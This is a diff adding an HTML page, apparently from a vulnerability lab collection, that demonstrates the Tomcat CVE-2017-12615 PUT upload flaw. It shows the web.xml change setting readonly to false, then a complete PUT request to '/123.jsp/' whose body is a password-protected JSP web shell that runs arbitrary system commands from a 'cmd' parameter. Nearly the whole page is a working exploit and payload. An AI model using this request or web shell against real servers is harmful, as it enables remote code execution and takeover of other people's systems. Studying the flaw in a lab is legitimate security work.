@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Tomcat PUT 文件上传测试</title>
+</head>
+<body>
+<div align="center">
+    CVE-2017-12615 远程代码执行漏洞，影响版本 Apache Tomcat 7.0.0 - 7.0.81
+    <br>
+    在 Tomcat web.xml 中修改如下配置
+    <br>
+    <textarea cols="80" rows="18">
+&lt;servlet&gt;
+    &lt;servlet-name&gt;default&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;
+    &lt;init-param&gt;
+        &lt;param-name&gt;debug&lt;/param-name&gt;
+        &lt;param-value&gt;0&lt;/param-value&gt;
+    &lt;/init-param&gt;
+    &lt;init-param&gt;
+        &lt;param-name&gt;listings&lt;/param-name&gt;
+        &lt;param-value&gt;false&lt;/param-value&gt;
+    &lt;/init-param&gt;
+    &lt;init-param&gt;
+        &lt;param-name&gt;readonly&lt;/param-name&gt;
+        &lt;param-value&gt;false&lt;/param-value&gt;
+    &lt;/init-param&gt;
+    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
+&lt;/servlet&gt;
+</textarea>
+    <br>
+    构造 PUT 数据包，尝试【/123.jsp/】 【/123.jsp::$DATA】
+    <br>
+    <textarea cols="80" rows="25">
+PUT /123.jsp/ HTTP/1.1
+Host: localhost:8080
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4093.3 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh,en;q=0.9,zh-CN;q=0.8
+Connection: close
+Content-Length: 662
+
+&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
++&quot;\\n&quot;);}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%&gt;&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;))){out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&lt;/pre&gt;&quot;);}else{out.println(&quot;:-)&quot;);}%&gt;
+</textarea>
+</div>
+</body>
+</html>
